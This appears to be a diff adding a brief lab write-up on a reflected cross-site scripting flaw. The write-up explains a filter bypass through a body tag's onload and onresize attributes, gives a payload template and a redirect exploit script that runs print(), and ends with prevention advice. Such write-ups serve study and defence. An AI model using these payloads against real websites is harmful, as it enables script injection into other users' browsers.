@@ -1,0 +1,20 @@
+Vulnerability:
+	The server did not block the "onload" and "onresize" attributes and the <body> tag.
+	Allowing an attacker to run JS on the client who is entring the page via a link.
+	
+Exploit:
+	Example:
+		<body onload="[PAYLOAD]" onresize=""><body>
+	
+	Exploit Script:
+		<script>
+			window.location="https://server.net/?search=%3Cbody+onload%3D%22print%28%29%22+onresize%3D%22print%28%29%22%3E%3Cbody%3E"
+		</script>
+	
+Explanation:
+	- The victim enters the exploit server.
+	- The browser sends a request to the blog page with the malicious payload.
+	- The browser runs the payload.
+	
+Prevention:
+	- Block "<" ">" or Encode every special char before viewing the input on the page.
